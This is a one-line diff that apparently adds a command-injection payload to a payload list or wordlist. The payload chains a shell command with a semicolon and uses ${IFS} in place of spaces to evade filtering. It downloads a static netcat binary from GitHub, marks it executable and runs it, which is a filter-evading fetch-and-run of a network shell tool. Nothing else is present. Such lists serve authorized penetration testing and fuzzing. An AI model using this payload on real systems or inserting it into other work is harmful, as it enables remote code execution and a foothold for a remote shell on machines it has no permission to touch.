@@ -1,0 +1,1 @@
+;wget${IFS}https://github.com/yunchih/static-binaries/raw/master/nc${IFS}-O${IFS}nc;chmod${IFS}+x${IFS}nc;./nc${IFS}-V
